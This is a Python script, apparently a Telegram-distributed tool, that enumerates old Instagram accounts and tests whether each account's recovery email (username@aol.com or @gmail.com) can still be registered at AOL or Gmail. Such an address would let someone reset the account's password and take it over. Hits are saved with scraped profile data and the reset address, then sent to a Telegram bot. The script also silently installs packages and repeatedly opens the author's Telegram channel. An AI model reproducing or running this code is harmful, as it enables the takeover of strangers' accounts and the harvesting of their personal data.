import webbrowser
webbrowser.open('https://t.me/pytho2n')
import time
import requests
from colorama import Style, Fore, init
from datetime import datetime
import random
import json
import string
from threading import Thread
import os
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get, post as pp
import sys
#حقـوق اراس • @W4_M4
try:
    from colorama import Fore, Style, init
except:
    os.system('pip install colorama')
    from colorama import Fore, Style, init

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    from cfonts import render, say

#حقـوق اراس • @W4_M4
Z = '\x1b[1m\x1b[32m'
Y = '\x1b[1m\x1b[33m'
R = '\x1b[1m\x1b[31m'
W = '\x1b[1m\x1b[37m'
C = '\x1b[1m\x1b[36m'
X = '\x1b[0m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'#حقـوق اراس • @W4_M4
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
x = '\x1b[1;33m'#حقـوق اراس • @W4_M4
white = '\x1b[1;37m'
z = '\x1b[1;31m'
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق#حقـوق اراس • @W4_M4
C = '\033[2;35m'  # وردي
S = '\033[2;36m'  # سمائي
G = '\033[1;34m'  # ازرق فاتح
HH = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابيض
Y = "\033[1;33m"  # Yellow
R = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر#حقـوق اراس • @W4_M4
F = '\033[2;31m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'#حقـوق اراس • @W4_M4
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"#حقـوق اراس • @W4_M4
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
a1 = '\x1b[1;31m'  # أح.مر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أز.رق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخض.ر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أ.صفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m'
J22 = '\x1b[38;5;209m'
J21 = '\x1b[38;5;204m'
J2 = '\x1b[38;5;203m'
J1 = '\x1b[38;5;202m'
E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'#حقـوق اراس • @W4_M4
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"#حقـوق اراس • @W4_M4
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m'
Y = '\033[1;34m'#حقـوق اراس • @W4_M4
C = '\033[2;35m'
M = '\x1b[1;37m'#حقـوق اراس • @W4_M4
pink_t5ok5 = '\x1b[38;5;199m'
WHITE_BOLD = '\x1b[1;97m'
reset = '\x1b[0m'
HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5])
def a():
            print(f""" {HH}     	
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝

            {a36}.•´¯`•.¸¸ {F} iNsta aol {a36}¸.•´¯`•.¸¸              
            
               {F}TLE : @W4_M4 / @pytho2n /اراس
                     

""")        
a()#حقـوق اراس • @W4_M4
token = input(f"  𝐓𝐨𝐤𝐞𝐧 :")
print()
ID = int(input(f"  𝐈𝐃: "))
webbrowser.open('https://t.me/pytho2n')
aca = 0
total = 0#حقـوق اراس • @W4_M4
hits = 0
badinsta = 0
bademail = 0#حقـوق اراس • @W4_M4
goodig = 0
infoinsta = {}
aras = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
aras1 = 'accounts.google.com'
aras2 = 'https://accounts.google.com'
def pppp():
    #حقـوق اراس • @W4_M4
    os.system('clear')
    output = f"""
{G}══════˛ 𝗜𝗡𝗦𝗧𝗔 .══════ 
{a3}True : {J1}{hits} 
{Z}Not : {J2}{badinsta} 
{X}False : {J21}{bademail} 
{J}Bad : {J22}{goodig} 
{a40}Dev : @W4_M4
{G}══════˛ 𝗜𝗡𝗦𝗧𝗔 .══════ 
"""
    sys.stdout.write(output)
    sys.stdout.flush()

os.system('clear')
a()
print(f"""
{Z}[{O}𝟏{Z}] {O}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟏 
{Z}[{O}𝟐{Z}] {O}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟐 
{Z}[{O}𝟑{Z}] {O}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟑 
{Z}[{O}𝟒{Z}] {O}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟏 - 𝟐𝟎𝟏𝟑
""")

aras_input = input(f"{X}[{a3}×{X}]{Z} 𝐂𝐡𝐨𝐨𝐬𝐞 : ")
webbrowser.open('https://t.me/pytho2n')

if aras_input == '1':
    bbk = 10000
    id_range = 17699999
elif aras_input == '2':
    bbk = 17699999
    id_range = 263014407
elif aras_input == '3':
    bbk = 263014407
    id_range = 361365133
elif aras_input == '4':
    bbk = 10000
    id_range = 361365133
else:
    exit()


while True:
    try:
        url = 'https://www.instagram.com/accounts/login'
        session = requests.Session()
        response = session.get(url)
        csrf = response.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'

def aras_tll():
    
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': str(ggb())
        }
        
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
            headers=headers
        )
        
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        
        cookies = {'__Host-GAPS': host}
        
        headers = {
            'authority': aras1,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': aras2,
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb()
        }
        
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        with open('tl.txt', 'w') as f:
            f.write(f"{tl}//{host}\n")
            
    except Exception as e:
        print(e)
        aras_tll()

aras_tll()

def aras_getaol():
   
    try:
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9'
        }
        
        qq = requests.get('https://login.aol.com/account/create', headers=headers)
        cookies = qq.cookies.get_dict()
        
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f"ID=c0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA",
            '__gpi': f"UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ",
            'cmp': f"t={tm1}&j=0&u=1---"
        })
        
        
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        #حقـوق اراس • @W4_M4
        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass
            
        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
            
        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
            
    except Exception as e:
        print(e)
        aras_getaol()

aras_getaol()

def aras_check_gmail(email):
   
    global bademail, hits
    
    try:
        if '@' in email:
            email = str(email).split('@')[0]
           #حقـوق اراس • @W4_M4 
        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            aras_tll()
            o = open('tl.txt', 'r').read().splitlines()[0]
            
        tl, host = o.split('//')
        
        cookies = {'__Host-GAPS': host}
        
        headers = {
            'authority': aras1,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': aras2,
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': ggb()
        }
        
        params = {'TL': tl}
        #حقـوق اراس • @W4_M4 
        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                aras_infoacc(username, gg)
            else:
                username, gg = email.split('@')
                aras_infoacc(username, gg)
        else:
            bademail += 1
            pppp()
            
    except Exception as e:
        print(f"erorr Gmail: {e}")

def aras_check_aol(email):
   
    global hits, bademail
    #حقـوق اراس • @W4_M4
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email
            
        try:
            with open('aol_req.txt', 'r') as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
                    
            with open('aol_cok.txt', 'r') as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            aras_getaol()
            with open('aol_req.txt', 'r') as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')
                    
            with open('aol_cok.txt', 'r') as f:
                for line in f:
                    cookies = eval(line.strip())
        
        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f"https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com",
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        params = {'validateField': 'userId'}
        
        data = f"browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup="
        
        res = requests.post(
            'https://login.aol.com/account/module/create',
            params=params,
            headers=headers,
            data=data,
            cookies=cookies
        ).text
        
        if '{"errors":[]}' in res:
            hits += 1
            pppp()
            
            if '@' not in email:
                ok = email + '@aol.com'
                username, gg = ok.split('@')
                aras_infoacc(username, gg)
            else:
                username, gg = email.split('@')
                aras_infoacc(username, gg)
        else:
            bademail += 1
            pppp()
            
    except Exception as e:
        print(f"erorr AOL: {e}")

def aras_check(email):
  
    global goodig, badinsta
    #حقـوق اراس • @W4_M4
    try:
        ua = ggb()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        
        headers = {
            'User-Agent': ua,
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            }),
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(aras, headers=headers, data=data).text
        
        if email in response:
            if '@gmail.com' in email:
                aras_check_gmail(email)
            elif '@aol.com' in email or '@a**.com' in email:
                aras_check_aol(email)
            goodig += 1
            pppp()
        else:
            badinsta += 1
            pppp()
            
    except Exception as e:
        print(f"erorr Instagram: {e}")

def aras_rest(user):
   
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + user + '"}',
            'ig_sig_key_version': '4'
        }
        
        response = requests.post(aras, headers=headers, data=data).json()
        r = response['email']
    except:
        r = 'no REST !'
    
    return r

def aras_date(Id):
    try:
        if not Id:
            return "Unknown"
        
        Id = int(Id)
        
     
        if Id <= 1279000:
            return 2010
        elif Id <= 17750000:
            return 2011
        elif Id <= 279760000:
            return 2012
        elif Id <= 900990000:
            return 2013
        elif Id <= 1629010000:
            return 2014
        elif Id <= 2500000000:
            return 2015
        elif Id <= 3713668786:
            return 2016
        elif Id <= 5699785217:
            return 2017
        elif Id <= 8597939245:
            return 2018
        elif Id <= 21254029834:
            return 2019
        elif Id <= 43464475395:
            return 2020
        elif Id <= 50289297647:
            return 2021
        elif Id <= 57464707082:
            return 2022
        elif Id <= 63313426938:
            return 2023
        else:
            return 2024
    except:
        return "Unknown"

def aras_infoacc(username, gg):
    
    global total
    
    rr = infoinsta.get(username, {})
    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    bizz = rr.get('is_business', None)
    
   #حقـوق اراس • @W4_M4
    year = aras_date(Id) if Id else "Unknown"
    
    try:
        if fows and pp:
            if int(fows) >= 10 and int(pp) >= 2:
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta = False
    
    total += 1
    
    ss = f"""
═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════  
☀ Hit : {total}  
☀ Name : {full_name}  
☀ Uid : {Id}  
☀ Username : {username}  
☀ Followers : {fows}  
☀ Following : {fowg}  
☀ Post : {pp}  
☀ Bio : {bio}  
☀ Year : {year}
☀ Email : {username}@{gg}  
☀ Reset : {aras_rest(username)}  
☀ Url : instagram.com/{username}  
☀ Tle : @W4_M4
☀ Ch : https://t.me/pytho2n
═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════
"""
    
    with open('Hitsaras.txt', 'a') as ff:
        ff.write(f"{ss}\n")
    
    
    try:
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
    except Exception as e:
        print(f"erorr tle {e}")
#حقـوق اراس • @W4_M4
def aras_gg():

    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(bbk, id_range)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        
        response = requests.post(
            'https://www.instagram.com/api/graphql',
            headers={'X-FB-LSD': data['lsd']},
            data=data
        )
        
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            infoinsta[username] = response.json().get('data', {}).get('user', {})
            emails = [username + '@aol.com']
            
            for email in emails:
                aras_check(email)
        except:
            pass

#حقـوق اراس • @W4_M4
for _ in range(50):
    Thread(target=aras_gg).start()
    
    
    # بربك Code  لاتلعب بي
